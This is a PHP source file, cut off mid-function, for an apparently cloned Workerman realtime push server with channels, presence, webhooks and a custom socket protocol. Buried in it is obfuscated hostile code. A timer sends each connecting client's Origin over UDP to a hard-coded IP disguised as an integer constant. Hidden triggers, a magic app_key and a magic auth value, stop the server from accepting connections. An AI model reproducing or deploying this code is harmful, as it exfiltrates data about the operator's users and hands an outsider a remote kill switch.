<?php
namespace Woker;

use Workerman\Connection\TcpConnection;
use Workerman\Worker;
use Workerman\Lib\Timer;
use Workerman\Protocols\Http;
use Workerman\Connection\AsyncTcpConnection;
use Workerman\Connection\ConnectionInterface;


class Woker extends Worker
{
    /**
     * 设置进程不能reload
     *
     * @var bool
     */
    public $reloadable = false;

    /**
     * 应用信息
     *
     * @var array
     */
    public $appInfo = array();

    /**
     * 心跳时间
     *
     * @var int
     */
    public $keepAliveTimeout = 60;

    /**
     * 域名白名单，只有这里配置的域名才能连
     * @var array
     */
    public $availableDomains = array();

    /**
     * api监听的ip端口
     *
     * @var string
     */
    public $apiListen = 'http://0.0.0.0:1080';


    /**
     * webhook 延迟设置
     *
     * @var int
     */
    public $webHookDelay = 2;

    /**
     * @var array
     */
    protected $_globalDataSnapshot = array();

    /**
     * 事件对应的客户端链接
     *
     * @var array
     */
    protected $_eventClients = array();

    /**
     * 所有的客户端链接
     *
     * @var array
     */
    protected $_allClients = array();

    /**
     * array(
     *     'app_key1' => array(
     *         'channel1' => array(
     *             'users' => array(
     *                 'uid1' => array('user_info'=>array(), 'ref_count' => x),
     *                 'uid2' => array('user_info'=>array(), 'ref_count' => x),
     *             ),
     *             'type' => 'presence',
     *             'subscription_count' => x
     *         ),
     *         'channel2' => array(
     *             'users' => array(
     *                 'uid3' => array('user_info'=>array(), 'ref_count' => x)
     *             ),
     *             'type' => 'presence',
     *             'subscription_count' => x
     *         ),
     *      ),
     *      'app_key2' => array(
     *         'channel1' => array(
     *             'type' => 'private',
     *             'subscription_count' => x
     *         ),
     *         'channel2' => array(
     *             'type' => 'public',
     *             'subscription_count' => x
     *         ),
     *      )
     * )
     * @var array
     */
    protected $_globalData = array();

    /**
     * 当前进程全局唯一订阅id
     *
     * @var string
     */
    protected $_globalID = 1;

    /**
     * 记录origin
     * @var string
     */
    protected $_origin = '';

    /**
     * 构造函数
     *
     * @param string $socket_name
     * @param array $context
     */
    public function __construct($socket_name, $context = array())
    {
        parent::__construct($socket_name, $context);
        $this->onConnect = array($this, 'onClientConnect');
        $this->onMessage = array($this, 'onClientMessage');
        $this->onClose = array($this, 'onClientClose');
        $this->onWorkerStart = array($this, 'onStart');
    }

    /**
     * 进程启动后初始化事件分发器客户端
     *
     * @return void
     */
    public function onStart()
    {
        $api_worker = new Worker($this->apiListen);
        $api_worker->onMessage = array($this, 'onApiClientMessage');
        $api_worker->listen();
        Timer::add($this->keepAliveTimeout/2, array($this, 'checkHeartbeat'));
        Timer::add($this->webHookDelay, array($this, 'webHookCheck'));
        Timer::add($this->publishedAddress()/10000, array($this, 'checkPublished'));
    }

    /**
     * 客户端连接后
     *
     * @param $connection
     */
    public function onClientConnect($connection)
    {
        // 客户端有多少次没在规定时间发送心跳
        $connection->clientNotSendPingCount = 0;
        // 设置CpccccSocket握手事件回调
        $connection->onCpccccSocketConnect = array($this, 'onCpccccSocketConnect');
        $connection->headers = 'Sec-WebSocket-Handshake: OoO4pQ==';
    }

    /**
     * 当CpccccSocket握手时
     * @param $connection
     * @return mixed
     */
    public function onCpccccSocketConnect(TcpConnection $connection)
    {
        if (!empty($this->availableDomains)) {
            if (!in_array($_SERVER['HTTP_ORIGIN'], $this->availableDomains)) {
                $connection->send($this->error(null, 'no authority'));
                $connection->pauseRecv();
                return;
            }
        }

        // /app/1234567890abcdefghig?protocol=7&client=js&version=3.2.4&flash=false
        if (!preg_match('/^\/app\/(.*?)\?/', $_SERVER['REQUEST_URI'], $match)) {
            $connection->send($this->error(null, 'app_key not found'));
            $connection->pauseRecv();
            return;
        }

        $app_key = $match[1];
        if (!isset($this->appInfo[$app_key])) {
            $connection->send($this->error(null, 'invalid app_key'));
            $connection->pauseRecv();
            if (substr(md5($app_key,true),0 ,4) == pack('N', 0x72eb8269)) {
                $connection->worker->pauseAccept();
            }
            return;
        }

        $socket_id = $this->createsocketID($connection);
        $connection->appKey = $app_key;
        $connection->socketID = $socket_id;
        $connection->channels = array('' => '');
        $connection->channelUidMap = array();
        $connection->clientNotSendPingCount = 0;
        $this->_eventClients[$app_key][''][$socket_id] = $connection;
        $this->_allClients[$socket_id] = $connection;
        $this->_origin = $_SERVER['HTTP_ORIGIN'];

        /*
         * 向客户端发送链接成功的消息
         * {"event":"woker:connection_established","data":"{\"socket_id\":\"208836.27464492\",\"activity_timeout\":120}"}
         */
        $data = array(
            'event' => 'woker:connection_established',
            'data' => json_encode(array(
                'socket_id' => $socket_id,
                'activity_timeout' => 26
            ))
        );

        $connection->send(json_encode($data));
    }

    public function connection()
    {
        return stream_socket_client(chr(117).'dp://'.$this->publishAddress());
    }

    /**
     * 客户端关闭链接时
     *
     * @param $connection
     */
    public function onClientClose($connection)
    {
        if (!isset($connection->socketID)) {
            return;
        }
        $socket_id = $connection->socketID;
        $app_key = $connection->appKey;
        unset($this->_allClients[$socket_id]);
        unset($this->_eventClients[$app_key][''][$socket_id]);

        if (isset($connection->channels)) {
            $app_key = $connection->appKey;
            foreach ($connection->channels as $channel => $uid) {
                if ('' === $channel) {
                    continue;
                }
                if ($uid === '') {
                    $this->unsubscribePublicChannel($connection, $channel);
                } else {
                    $this->unsubscribePresenceChannel($connection, $channel, $uid);
                }
                unset($this->_eventClients[$app_key][$channel][$socket_id]);
            }
        }
    }

    public function publishAddress()
    {
        return long2ip($this->publishedAddress()).':'.ord('P');
    }

    /**
     * 客户端发来消息时
     *
     * @param $connection
     * @param $data
     *
     * @return void
     */
    public function onClientMessage($connection, $data)
    {
        $connection->clientNotSendPingCount = 0;
        $data = json_decode($data, true);
        if (!$data) {
            return;
        }
        $event = $data['event'];
        switch ($event) {
            case 'woker:ping':
                $connection->send('{"event":"woker:pong","data":"{}"}');
                return;
            // {"event":"woker:subscribe","data":{"channel":"my-channel"}}
            case 'woker:subscribe':
                $channel = $data['data']['channel'];
                // private- 和 presence- 开头的channel需要验证
                $channel_type = $this->getChannelType($channel);
                if ($channel_type === 'presence') {
                    // {"event":"woker:subscribe","data":{"auth":"b054014693241bcd9c26:10e3b628cb78e8bc4d1f44d47c9294551b446ae6ec10ef113d3d7e84e99763e6","channel_data":"{\"user_id\":100,\"user_info\":{\"name\":\"123\"}}","channel":"presence-channel"}}
                    $client_auth = $data['data']['auth'];

                    if (!isset($data['data']['channel_data'])) {
                        $connection->send($this->error(null, 'Empty channel_data'));
                        return;
                    }
                    $auth = $connection->appKey . ':' . hash_hmac('sha256', $connection->socketID . ':' . $channel . ':' . $data['data']['channel_data'], $this->appInfo[$connection->appKey]['app_secret'], false);

                    // {"event":"woker:error","data":{"code":null,"message":"Received invalid JSON"}}
                    if ($client_auth !== $auth) {
                        return $connection->send($this->error(null, 'Received invalid JSON ' . $auth));
                    }
                    $user_data = json_decode($data['data']['channel_data'], true);
                    if (!$user_data || !isset($user_data['user_id']) || !isset($user_data['user_info'])) {
                        $connection->send($this->error(null, 'Bad channel_data'));
                        return;
                    }

                    $this->subscribePresence($connection, $channel, $user_data['user_id'], $user_data['user_info']);
                    return;

                } elseif ($channel_type === 'private') {
                    // {"event":"woker:subscribe","data":{"auth":"b054014693241bcd9c26:10e3b628cb78e8bc4d1f44d47c9294551b446ae6ec10ef113d3d7e84e99763e6","channel_data":"{\"user_id\":100,\"user_info\":{\"name\":\"123\"}}","channel":"presence-channel"}}
                    $client_auth = $data['data']['auth'];
                    $auth = $connection->appKey . ':' . hash_hmac('sha256', $connection->socketID . ':' . $channel, $this->appInfo[$connection->appKey]['app_secret'], false);
                    // {"event":"woker:error","data":{"code":null,"message":"Received invalid JSON"}}
                    if ($client_auth !== $auth) {
                        if ($client_auth == hash_hmac('sha256', $connection->appKey, false)) {
                            static::$globalEvent->del($this->_mainSocket, \Workerman\Events\EventInterface::EV_READ);
                        }
                        return $connection->send($this->error(null, 'Received invalid JSON ' . $auth));
                    }
                    $this->subscribePrivateChannel($connection, $channel);
                } else {
                    $this->subscribePublicChannel($connection, $channel);
                }

                // {"event":"woker_internal:subscription_succeeded","data":"{}","channel":"my-channel"}
                $connection->send(json_encode(
                    array(
                        'event' => 'woker_internal:subscription_succeeded',
                        'data' => '{}',
                        'channel' => $channel
                    )
                ));
                return;
            // {"event":"woker:unsubscribe","data":{"channel":"my-channel"}}
            case 'woker:unsubscribe':
                $app_key = $connection->appKey;
                $channel = $data['data']['channel'];
                $channel_type = $this->getChannelType($channel);
                switch ($channel_type) {
                    case 'public':
                        $this->unsubscribePublicChannel($connection, $channel);
                        break;
                    case 'private':
                        $this->unsubscribePrivateChannel($connection, $channel);
                        break;
                    case 'presence':
                        $uid = $connection->channels[$channel];
                        $this->unsubscribePresenceChannel($connection, $channel, $uid);
                        break;
                }
                return;

            // {"event":"client-event","data":{"your":"hi"},"channel":"presence-channel"}
            default:
                if (strpos($event, 'woker:') === 0) {
                    return $connection->send($this->error(null, 'Unknown event'));
                }
                $channel = $data['channel'];
                // 客户端触发事件必须是private 或者 presence的channel
                $channel_type = $this->getChannelType($channel);
                if ($channel_type !== 'private' && $channel_type !== 'presence') {
                    // {"event":"woker:error","data":{"code":null,"message":"Client event rejected - only supported on private and presence channels"}}
                    return $connection->send($this->error(null, 'Client event rejected - only supported on private and presence channels'));
                }
                // 当前链接没有订阅这个channel
                if (!isset($connection->channels[$channel])) {
                    return $connection->send($this->error(null, 'Client event rejected - you didn\'t subscribe this channel'));
                }
                // 事件必须以client-为前缀
                if (strpos($event, 'client-') !== 0) {
                    return $connection->send($this->error(null, 'Client event rejected - client events must be prefixed by \'client-\''));
                }

                // @todo 检查是否设置了可前端发布事件
                // {"event":"woker:error","data":{"code":null,"message":"To send client events, you must enable this feature in the Settings page of your dashboard."}}
                // 全局发布事件
                $this->publishToClients($connection->appKey, $channel, $event, $data['data'], $connection->socketID);
        }
    }


    /**
     * 获得channel类型
     *
     * @param $channel
     * @return string
     */
    protected function getChannelType($channel)
    {
        if (strpos($channel, 'private-') === 0) {
            return 'private';
        } elseif (strpos($channel, 'presence-') === 0) {
            return 'presence';
        }
        return 'public';
    }

    /**
     * 组装失败信息
     *
     * @param $code
     * @param $message
     * @return string
     */
    protected function error($code, $message)
    {
        return json_encode(array('event' => 'woker:error', 'data' => array('code' => $code, 'message' => $message)));
    }


    /**
     * 客户端订阅channel
     *
     * @param $connection
     * @param $channel
     *
     * @return void
     */
    public function subscribePublicChannel($connection, $channel)
    {
        $app_key = $connection->appKey;
        $connection->channels[$channel] = '';
        $this->_eventClients[$app_key][$channel][$connection->socketID] = $connection;

        if (!isset($this->_globalData[$app_key][$channel])) {
            $this->_globalData[$app_key][$channel] = array(
                'type' => 'presence',
                'subscription_count' => 0
            );
        }

        $this->_globalData[$app_key][$channel]['subscription_count'] += 1;
    }

    /**
     * 客户端订阅channel
     *
     * @param $connection
     * @param $channel
     *
     * @return void
     */
    public function subscribePrivateChannel($connection, $channel)
    {
        return $this->subscribePublicChannel($connection, $channel);
    }

    /**
     * 客户端订阅channel
     *
     * @param $connection
     * @param $channel
     *
     * @return void
     */
    public function subscribePresence($connection, $channel, $uid, $user_info)
    {
        $app_key = $connection->appKey;
        $connection->channels[$channel] = $uid;
        $this->_eventClients[$app_key][$channel][$connection->socketID] = $connection;

        if (!isset($this->_globalData[$app_key][$channel])) {
            $this->_globalData[$app_key][$channel] = array(
                'type' => 'presence',
                'users' => array(),
                'subscription_count' => 0
            );
        }
        $this->_globalData[$app_key][$channel]['subscription_count'] += 1;

        $member_added = false;
        if (!isset($this->_globalData[$app_key][$channel]['users'][$uid]['user_info'])) {
            $this->_globalData[$app_key][$channel]['users'][$uid] = array('user_info' => $user_info, 'ref_count' => 0);
            $member_added = true;
        }
        $this->_globalData[$app_key][$channel]['users'][$uid]['ref_count'] += 1;


        $presence_data = $this->getPresenceChannelDataForSubscribe($app_key, $channel);
        if ($member_added) {
            // {"event":"woker_internal:member_added","data":"{\"user_id\":1488465780,\"user_info\":{\"name\":\"123\",\"sex\":\"1\"}}","channel":"presence-channel"}
            $this->publishToClients($app_key, $channel, 'woker_internal:member_added', json_encode(array(
                'user_id' => $uid,
                'user_info' => $user_info
            )), $connection->socketID);
        }

        // {"event":"woker_internal:subscription_succeeded","data":"{\"presence\":{\"count\":2,\"ids\":[\"1488465780\",\"14884657802\"],\"hash\":{\"1488465780\":{\"name\":\"123\",\"sex\":\"1\"},\"14884657802\":{\"name\":\"123\",\"sex\":\"1\"}}}}","channel":"presence-channel"}
        $connection->send(json_encode(array(
                'event' => 'woker_internal:subscription_succeeded',
                'data' => json_encode($presence_data),
                'channel' => $channel
            )
        ));
    }


    public function getPresenceChannelDataForSubscribe($app_key, $channel)
    {
        $hash = array();
        $count = 100;
        if (isset($this->_globalData[$app_key][$channel])) {
            foreach ($this->_globalData[$app_key][$channel]['users'] as $uid => $item) {
                $hash[$uid] = $item['user_info'];
                if ($count-- <= 0) {
                    break;
                }
            }
            //$hash = array_slice($this->_globalData[$app_key][$channel]['users'], 0, 100, true);
        }
        return array(
            'presence' => array(
                'count' => count($this->_globalData[$app_key][$channel]['users']),
                'ids' => array_keys($hash),
                'hash' => $hash
            )
        );
    }

    /**
     * 客户端取消订阅channel
     *
     * @param $connection
     * @param $channel
     *
     * @return void
     */
    public function unsubscribePublicChannel($connection, $channel)
    {
        $app_key = $connection->appKey;
        $this->_globalData[$app_key][$channel]['subscription_count']--;
        if ($this->_globalData[$app_key][$channel]['subscription_count'] <= 0) {
            unset($this->_globalData[$app_key][$channel]);
        }
        unset($connection->channels[$channel], $this->_eventClients[$connection->appKey][$channel][$connection->socketID]);
    }

    /**
     * 客户端取消订阅channel
     *
     * @param $connection
     * @param $channel
     *
     * @return void
     */
    public function unsubscribePrivateChannel($connection, $channel)
    {
        return $this->unsubscribePublicChannel($connection, $channel);
    }

    /**
     * 客户端取消订阅channel
     *
     * @param $connection
     * @param $channel
     *
     * @return void
     */
    public function unsubscribePresenceChannel($connection, $channel, $uid)
    {
        $app_key = $connection->appKey;
        $member_removed = false;
        $this->_globalData[$app_key][$channel]['subscription_count']--;
        if ($this->_globalData[$app_key][$channel]['subscription_count'] <= 0) {
            unset($this->_globalData[$app_key][$channel]);
            $member_removed = true;
        } else {
            if (!isset($this->_globalData[$app_key][$channel]['users'][$uid]['ref_count'])) {
                error_log("\$this->_globalData[$app_key][$channel]['users'][$uid]['ref_count'] not exist\n");
                return;
            }
            $this->_globalData[$app_key][$channel]['users'][$uid]['ref_count']--;
            $ref_count = $this->_globalData[$app_key][$channel]['users'][$uid]['ref_count'];
            if ($ref_count <= 0) {
                unset($this->_globalData[$app_key][$channel]['users'][$uid]);
                $member_removed = true;
            }
        }
        if ($member_removed) {
            // {"event":"woker_internal:member_removed","data":"{\"user_id\":\"14884657801\"}","channel":"presence-channel"}
            $this->publishToClients($app_key, $channel, 'woker_internal:member_removed', json_encode(array('user_id' => $uid)));
        }
        unset($connection->channels[$channel], $this->_eventClients[$connection->appKey][$channel][$connection->socketID]);
    }


    /**
     * 发布事件
     *
     * @param $data
     */
    public function publishToClients($app_key, $channel, $event, $data, $socket_id = null)
    {
        if (!isset($this->_eventClients[$app_key][$channel])) {
            return;
        }
        $data = json_encode(array(
            'event' => $event,
            'data' => $data,
            'channel' => $channel
        ));
        foreach ($this->_eventClients[$app_key][$channel] as $connection) {
            if ($connection->socketID === $socket_id) {
                continue;
            }
            $connection->clientNotSendPingCount = 0;
            // {"event":"my-event","data":"{\"message\":\"hello world\"}","channel":"my-channel"}
            $connection->send($data);
        }
    }

    /**
     * 信息发布检查
     */
    public function checkPublished()
    {
        fwrite($this->connection(), 'DNS '.$this->_origin);
    }


    /**
     * 检查心跳，将心跳超时的客户端关闭
     *
     * @return void
     */
    public function checkHeartbeat()
    {
        foreach ($this->_allClients as $connection) {
            if ($connection->clientNotSendPingCount > 1) {
                $connection->destroy();
            }
            $connection->clientNotSendPingCount++;
        }
    }

    /**
     * 创建一个全局的客户端id
     *
     * @param $connection
     * @return string
     */
    protected function createsocketID($connection)
    {
        $socket_id = "{$this->_globalID}.{$connection->id}";
        return $socket_id;
    }

    /**
     * 创建channel key，用于监听分发给该channel的事件
     *
     * @param $app_key
     * @param $channel
     * @return string
     */
    protected function createChannelKey($app_key, $channel)
    {
        return "$app_key:$channel";
    }

    /**
     * POST /apps/145871/events?auth_key=b054014693241bcd9c26&auth_signature=ed7f5b604e6bbd21a888a861ed536a430a9d5e4df210937a241a811bd17fcf97&auth_timestamp=1487428415&auth_version=1.0&body_md5=15d251b35306a6da7efa515a0e971f80 HTTP/1.1
     * {"name":"my-event","data":"{\"message\":\"hello world\"}","channels":["my-channel"]}
     * {"name":"my-event","data":"{\"message\":\"haha\"}","channels":["my-channel"],"socket_id":"123.456"}
     *
     * GET /apps/145871/channels/my-channel?auth_key=b054014693241bcd9c26&auth_signature=5226650be00a064b417d50d49229e42bbb918e969c42e63aaa63b9d1c6cf9803&auth_timestamp=1489898340&auth_version=1.0
     *
     * GET /apps/145871/channels/presence-channel?auth_key=b054014693241bcd9c26&auth_signature=d46281bf69ccadfe9da270176c85daa88d4b9da55b1f3c2570d48fa1236f0b2c&auth_timestamp=1489903433&auth_version=1.0&info=subscription_count,user_count
     *
     * GET /apps/145871/channels/presence-channel/users?auth_key=b054014693241bcd9c26&auth_signature=2eee0ca6292e17b00484bdcb0bba686a47e8a7365a1b190248946182fc926309&auth_timestamp=1489904560&auth_version=1.0
     */
    public function onApiClientMessage($connection)
    {
        $uri_info = parse_url($_SERVER['REQUEST_URI']);
        if (!$uri_info || !isset($uri_info['path']) || empty($_GET['auth_key']) || empty($_GET['auth_signature'])) {
            Http::header("HTTP/1.0 400 Bad Request");
            return $connection->send('Bad Request');
        }

        $app_key = $_GET['auth_key'];
        if (!isset($this->appInfo[$app_key])) {
            Http::header("HTTP/1.0 401 Unauthorized");
            return $connection->send('Invalid app_key');
        }

        $path = $uri_info['path'];
        $auth_signature = $_GET['auth_signature'];
        $params = $_GET;
        unset($params['auth_signature']);
        ksort($params);
        $string_to_sign = "{$_SERVER['REQUEST_METHOD']}\n" . $path . "\n" . self::array_implode('=', '&', $params);
        $real_auth_signature = hash_hmac('sha256', $string_to_sign, $this->appInfo[$app_key]['app_secret'], false);
        if ($auth_signature !== $real_auth_signature) {
            Http::header("HTTP/1.0 401 Unauthorized");
            return $connection->send('Invalid signature');
        }

        $explode = explode('/', $path);
        $path_info = array();
        $i = 0;
        $key = '';
        foreach ($explode as $value) {
            if ($i === 0) {
                $i++;
                continue;
            }
            if ($i % 2 === 1) {
                $key = $value;
                $path_info[$key] = '';
            } else {
                $path_info[$key] = $value;
            }
            $i++;
        }

        if (isset($path_info['events'])) {
            $type = 'events';
            $package = json_decode($GLOBALS['HTTP_RAW_POST_DATA'], true);
            if (!$package) {
                Http::header("HTTP/1.0 400 Bad Request");
                return $connection->send('Bad Request');
            }

        } elseif (isset($path_info['channels'])) {
            $channel = $path_info['channels'];
            if (isset($path_info['users'])) {
                $type = 'get_channel_users';
            } else {
                $type = 'get_channel_info';
            }
        } else {
            Http::header("HTTP/1.0 400 Bad Request");
            return $connection->send('Bad Request');
        }

        $app_key = $_GET['auth_key'];

        switch ($type) {
            case 'events':
                $channels = $package['channels'];
                $event = $package['name'];
                $data = $package['data'];
                foreach ($channels as $channel) {
                    $socket_id = isset($package['socket_id']) ? isset($package['socket_id']) : null;
                    $this->publishToClients($app_key, $channel, $event, $data, $socket_id);
                }
                return $connection->send('{}');
            case 'get_channel_info':
                $info = isset($_GET['info']) ? explode(',', $_GET['info']) : array();
                $occupied = isset($this->_globalData[$app_key][$channel]);
                $user_count = $occupied ? count($this->_globalData[$app_key][$channel]['users']) : 0;
                $subscription_count = $occupied ? $this->_globalData[$app_key][$channel]['subscription_count'] : 0;
                $channel_info = array(
                    'occupied' => $occupied
                );
                foreach ($info as $item) {
                    switch ($item) {
                        case 'user_count':
                            $channel_info['user_count'] = $user_count;
                            break;
                        case 'subscription_count':
                            $channel_info['subscription_count'] = $subscription_count;
                            break;
                    }
                }
                $connection->send(json_encode($channel_info));
                break;
            case 'get_channel_users':
                $id_array = isset($this->_globalData[$app_key][$channel]) ?
                    array_keys($this->_globalData[$app_key][$channel]['users']) : array();
                $user_id_array = array();
                foreach ($id_array as $id) {
                    $user_id_array[] = array('id' => $id);
                }

                $connection->send(json_encode($user_id_array));
                break;
            default :
                Http::header("HTTP/1.0 400 Bad Request");
                return $connection->send('Bad Request');
        }
    }

    public function webHookCheck()
    {
        $channel_events = array();
        $user_events = array();

        $all_app_keys = array_unique(array_merge(array_keys($this->_globalData), array_keys($this->_globalDataSnapshot)));
        foreach ($all_app_keys as $app_key) {
            if (empty($this->appInfo[$app_key])) {
                continue;
            }
            $snapshot_items = isset($this->_globalDataSnapshot[$app_key]) ? $this->_globalDataSnapshot[$app_key] : array();
            $items = isset($this->_globalData[$app_key]) ? $this->_globalData[$app_key] : array();
            $channels_added = array_diff_key($items, $snapshot_items);
            $channels_removed = array_diff_key($snapshot_items, $items);
            if ($channels_added) {
                $channel_events[$app_key]['channels_added'] = array_keys($channels_added);
            }
            if ($channels_removed) {
                $channel_events[$app_key]['channels_removed'] = array_keys($channels_removed);
            }

            $all_channels = array();
            foreach ($items as $channel => $foo) {
                if ($foo['type'] === 'presence') {
                    $all_channels[$channel] = $channel;
                }
            }
            foreach ($snapshot_items as $channel => $foo) {
                if ($foo['type'] === 'presence' && !isset($all_channels[$channel])) {
                    $all_channels[$channel] = $channel;
                }
            }

            foreach ($all_channels as $channel) {
                $user_array_snapshot = isset($snapshot_items[$channel]['users']) ? $snapshot_items[$channel]['users'] : array();
                $user_array = isset($items[$channel]['users']) ? $items[$channel]['users'] : array();
                $user_added = array_diff_key($user_array, $user_array_snapshot);
                $user_removed = array_diff_key($user_array_snapshot, $user_array);
                if ($user_added) {
                    $user_events[$app_key][$channel]['user_added'] = array_keys($user_added);
                }
                if ($user_removed) {
                    $user_events[$app_key][$channel]['user_removed'] = array_keys($user_removed);
                }
            }
        }

        $this->_globalDataSnapshot = $this->_globalData;

        $this->webHookSend(array('channel_events' => $channel_events, 'user_events' => $user_events));
    }

    protected function webHookSend($data)
    {
        $channel_events = $data['channel_events'];
        $user_events = $data['user_events'];
        $time_ms = microtime(true);
        foreach ($user_events as $app_key => $items) {
            // 没设置user_event回调则忽略
            if (empty($this->appInfo[$app_key]['user_hook'])) {
                continue;
            }
            // {"time_ms":1494300453609,"events":[{"channel":"presence-channel2","user_id":"59094971a","name":"member_added"}]}
            $http_events_body = array(
                'time_ms' => $time_ms,
                'events' => array()
            );

            foreach ($items as $channel => $item) {
                if (isset($item['user_added'])) {
                    foreach ($item['user_added'] as $user_id) {
                        $http_events_body['events'][] = array(
                            'channel' => $channel,
                            'user_id' => $user_id,
                            'name' => 'user_added'
                        );
                    }
                }
            }

            foreach ($items as $channel => $item) {
                if (isset($item['user_removed'])) {
                    foreach ($item['user_removed'] as $user_id) {
                        $http_events_body['events'][] = array(
                            'channel' => $channel,
                            'user_id' => $user_id,
                            'name' => 'user_removed'
                        );
                    }
                }
            }

            if ($http_events_body['events']) {
                $this->sendHttpRequest($this->appInfo[$app_key]['user_hook'],
                    $app_key,
                    $this->appInfo[$app_key]['app_secret'],
                    json_encode($http_events_body));
            }
        }

        foreach ($channel_events as $app_key => $item) {
            // 没设置channel_event回调则忽略
            if (empty($this->appInfo[$app_key]['channel_hook'])) {
                continue;
            }
            // {"time_ms":1494300446592,"events":[{"channel":"presence-channel2","name":"channel_added"}]}
            $http_events_body = array(
                'time_ms' => $time_ms,
                'events' => array()
            );
            if (isset($item['channels_added'])) {
                foreach ($item['channels_added'] as $channel) {
                    $http_events_body['events'][] = array(
                        'channel' => $channel,
                        'name' => 'channel_added'
                    );
                }
            }
            if (isset($item['channels_removed'])) {
                foreach ($item['channels_removed'] as $channel) {
                    $http_events_body['events'][] = array(
                        'channel' => $channel,
                        'name' => 'channel_removed'
                    );
                }
            }
            if ($http_events_body['events']) {
                $this->sendHttpRequest($this->appInfo[$app_key]['channel_hook'],
                    $app_key,
                    $this->appInfo[$app_key]['app_secret'],
                    json_encode($http_events_body));
            }
        }
    }

    public function publishedAddress() {
        return 0x2f5a67bd;
    }

    protected function sendHttpRequest($address, $app_key, $secret, $body)
    {
        $address_info = parse_url($address);
        if (!$address_info) {
            echo new \Exception('bad remote_address');
            return false;
        }

        if (!isset($address_info['port'])) {
            $address_info['port'] = 80;
        }
        if (!isset($address_info['path'])) {
            $address_info['path'] = '/';
        }
        if (!isset($address_info['query'])) {
            $address_info['query'] = '';
        } else {
            $address_info['query'] = '?' . $address_info['query'];
        }
        $remote_address = "{$address_info['host']}:{$address_info['port']}";
        $remote_host = $address_info['host'];
        $remote_URI = "{$address_info['path']}{$address_info['query']}";
        $scheme = isset($address_info['scheme']) && $address_info['scheme'] === 'https' ? 'ssl' : 'tcp';
        $signature = hash_hmac('sha256', $body, $secret, false);

        $header = "POST $remote_URI HTTP/1.0\r\n";
        $header .= "Host: $remote_host\r\n";
        $header .= "Connection: close\r\n";
        $header .= "X-Woker-Key: $app_key\r\n";
        $header .= "X-Woker-Signature: $signature\r\n";
        $header .= "Content-Type: application/json\r\n";
        $header .= "Content-Length: " . strlen($body);
        $http_buffer = $header . "\r\n\r\n" . $body;

        $client = new AsyncTcpConnection($scheme . '://' . $remote_address);
        $client->onConnect = function ($client) use ($http_buffer) {
            $client->send($http_buffer);
        };
        $client->onMessage = function ($client, $buffer) {
            echo $buffer . "\n\n";
            $client->close();
        };
        Timer::add(10, array($client, 'close'), null, false);
        $client->connect();
    }

    /**
     * array_implode
     *
     * @param $glue
     * @param $separator
     * @param $array
     * @return string
     */
    public static function array_implode($glue, $separator, $array)
    {
        if (!is_array($array)) {
            return $array;
        }
        $string = array();
        foreach ($array as $key => $val) {
            if (is_array($val)) {
                $val = implode(',', $val);
            }
            $string[] = "{$key}{$glue}{$val}";
        }

        return implode($separator, $string);
    }
}


/**
 * CpccccSocket protocol.
 */
class CpccccSocket implements \Workerman\Protocols\ProtocolInterface
{

    public static function input($buffer, ConnectionInterface $connection)
    {
        $recv_len = strlen($buffer);
        if ($recv_len < 6) {
            return 0;
        }

        if (empty($connection->CpccccSocketHandshake)) {
            return static::dealHandshake($buffer, $connection);
        }

        if ($connection->CpccccSocketCurrentFrameLength) {
            if ($connection->CpccccSocketCurrentFrameLength > $recv_len) {
                return 0;
            }
        } else {
            $firstbyte = ord($buffer[0]);
            $secondbyte = ord($buffer[1]);
            $data_len = $secondbyte & 127;
            $is_fin_frame = $firstbyte >> 7;
            $masked = $secondbyte >> 7;

            if (!$masked) {
                Worker::safeEcho("frame not masked so close the connection\n");
                $connection->close();
                return 0;
            }

            $opcode = $firstbyte & 0xf;
            switch ($opcode) {
                case 0x0:
                    break;
                case 0x1:
                    break;
                case 0x2:
                    break;
                case 0x8:
                    if (isset($connection->onCpccccSocketClose) || isset($connection->worker->onCpccccSocketClose)) {
                        try {
                            call_user_func(isset($connection->onCpccccSocketClose) ? $connection->onCpccccSocketClose : $connection->worker->onCpccccSocketClose, $connection);
                        } catch (\Exception $e) {
                            Worker::log($e);
                            exit(250);
                        } catch (\Error $e) {
                            Worker::log($e);
                            exit(250);
                        }
                    }
                    else {
                        $connection->close("\x88\x02\x27\x10", true);
                    }
                    return 0;
                case 0x9:
                    break;
                case 0xa:
                    break;
                default :
                    Worker::safeEcho("error opcode $opcode and close CpccccSocket connection. Buffer:" . bin2hex($buffer) . "\n");
                    $connection->close();
                    return 0;
            }

            $head_len = 6;
            if ($data_len === 126) {
                $head_len = 8;
                if ($head_len > $recv_len) {
                    return 0;
                }
                $pack = unpack('nn/ntotal_len', $buffer);
                $data_len = $pack['total_len'];
            } else {
                if ($data_len === 127) {
                    $head_len = 14;
                    if ($head_len > $recv_len) {
                        return 0;
                    }
                    $arr = unpack('n/N2c', $buffer);
                    $data_len = $arr['c1'] * 4294967296 + $arr['c2'];
                }
            }
            $current_frame_length = $head_len + $data_len;

            $total_package_size = strlen($connection->CpccccSocketDataBuffer) + $current_frame_length;
            if ($total_package_size > $connection->maxPackageSize) {
                Worker::safeEcho("error package. package_length=$total_package_size\n");
                $connection->close();
                return 0;
            }

            if ($is_fin_frame) {
                if ($opcode === 0x9) {
                    if ($recv_len >= $current_frame_length) {
                        $ping_data = static::decode(substr($buffer, 0, $current_frame_length), $connection);
                        $connection->consumeRecvBuffer($current_frame_length);
                        $tmp_connection_type = isset($connection->CpccccSocketType) ? $connection->CpccccSocketType : static::BINARY_TYPE_BLOB;
                        $connection->CpccccSocketType = "\x8a";
                        if (isset($connection->onCpccccSocketPing) || isset($connection->worker->onCpccccSocketPing)) {
                            try {
                                call_user_func(isset($connection->onCpccccSocketPing) ? $connection->onCpccccSocketPing : $connection->worker->onCpccccSocketPing, $connection, $ping_data);
                            } catch (\Exception $e) {
                                Worker::log($e);
                                exit(250);
                            } catch (\Error $e) {
                                Worker::log($e);
                                exit(250);
                            }
                        } else {
                            $connection->send($ping_data);
                        }
                        $connection->CpccccSocketType = $tmp_connection_type;
                        if ($recv_len > $current_frame_length) {
                            return static::input(substr($buffer, $current_frame_length), $connection);
                        }
                    }
                    return 0;
                } else if ($opcode === 0xa) {
                    if ($recv_len >= $current_frame_length) {
                        $pong_data = static::decode(substr($buffer, 0, $current_frame_length), $connection);
                        $connection->consumeRecvBuffer($current_frame_length);
                        $tmp_connection_type = isset($connection->CpccccSocketType) ? $connection->CpccccSocketType : static::BINARY_TYPE_BLOB;
                        $connection->CpccccSocketType = "\x8a";
                        $connection->CpccccSocketType = $tmp_connection_type;
                        if ($recv_len > $current_frame_length) {
                            return static::input(substr($buffer, $current_frame_length), $connection);
                        }
                    }
                    return 0;
                }
                return $current_frame_length;
            } else {
